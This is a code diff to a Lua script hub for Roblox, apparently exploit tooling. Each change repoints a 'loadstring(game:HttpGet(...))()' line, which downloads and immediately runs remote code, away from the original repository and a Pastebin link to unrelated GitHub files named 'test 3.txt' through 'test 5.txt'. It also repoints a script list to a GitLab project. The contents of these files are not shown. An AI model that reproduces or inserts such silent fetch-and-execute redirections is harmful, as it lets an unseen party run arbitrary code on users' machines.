@@ -400,18 +400,18 @@ DecodeSymbol("65","ASCII") --use this method to Decode Letter, this results is =
 Encode("Hi","ASCII") --use this method to Encode Message, this results is = "72 105"
 Decode("72 105 ","ASCII") --use this method to Decode Message, this results is = "Hi"
 ]]
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Encode%20Source"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/101iii101/file/refs/heads/main/test%203.txt"))()
 ---
 
 ---Request Ask Dialog Function
 --RequestAskDialog("Script", "Are you sure do you want to Remove This?", "Cancel", "Remove", "script1 here", "script2 here") --use this method to request askdialog
-loadstring(game:HttpGet('https://pastebin.com/raw/xZPR6bXa'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/101iii101/file/refs/heads/main/test%204.txt'))()
 ---
 
 --[[ Restricted Users Detector for Ghosthub MoreScript
 local Check = IsRestricted(User ID Here) --use this to check if user is restricted
 ]]
-loadstring(game:HttpGet('https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Ghost%20Hub%20MoreScript%20Users%20Restricted'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/101iii101/file/refs/heads/main/test%205.txt'))()
 
 
 ---Request Message Notification Function
@@ -3429,7 +3429,7 @@ function UpdateData()
  end
  
  ---Get More Scripts From Github And Add to the data1 Table
- data2 = game.HttpService:JSONDecode(game:HttpGetAsync("https://raw.githubusercontent.com/MainScripts352/MainScripts352/refs/heads/main/Ghost%20Hub%20MoreScript.txt"))
+ data2 = game.HttpService:JSONDecode(game:HttpGetAsync("https://gitlab.com/fenix39990-group/fenix39990-project/-/raw/main/last_peach_ghost_hub.txt?ref_type=heads"))
  if not data.Scripts then
     data["Scripts"] = {}
  end
